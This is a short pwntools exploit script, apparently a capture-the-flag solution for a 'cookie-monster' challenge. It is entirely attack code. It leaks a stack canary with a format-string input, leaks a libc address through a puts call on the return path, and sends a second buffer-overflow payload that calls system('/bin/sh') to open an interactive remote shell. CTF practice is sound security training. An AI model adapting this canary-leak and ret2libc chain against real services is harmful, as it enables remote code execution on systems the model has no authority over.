from pwn import *
#p=process('./cookie-monster')
p=remote('chals.damctf.xyz',31312)
elf = ELF('./cookie-monster')
libc = ELF('libc6-i386_2.27-3ubuntu1.4_amd64.so')
#raw_input("DEBUG")
p.sendline("%15$p")
p.recvuntil('Hello ')

canary = int(p.recv(10),16)
log.info("Canary: "+hex(canary))

puts_got = elf.symbols['got.puts']
puts_plt = elf.symbols['plt.puts']
main = elf.symbols['main']

payload = "a"*32+p32(canary)
payload = payload.ljust(48,"a")
payload += p32(puts_plt)
payload += p32(main)
payload += p32(puts_got)
p.sendlineafter("purchase?\n",payload)


p.recvuntil("day!\n")
puts_libc = u32(p.recv(4))
log.info("Leak: "+hex(puts_libc))
offset_puts=libc.symbols['puts']
libc_base = puts_libc - offset_puts
log.info("Base: "+hex(libc_base))

offset_sys = libc.symbols['system']
offset_bin =  libc.search('/bin/sh').next()
system_thuc = libc_base + offset_sys
bin_thuc = libc_base + offset_bin

p.sendline("%15$p")

payload = "a"*32+p32(canary)
payload = payload.ljust(48,"a")
payload += p32(system_thuc)
payload += "BBBB"
payload += p32(bin_thuc)
p.sendlineafter("name: ",payload)
p.interactive()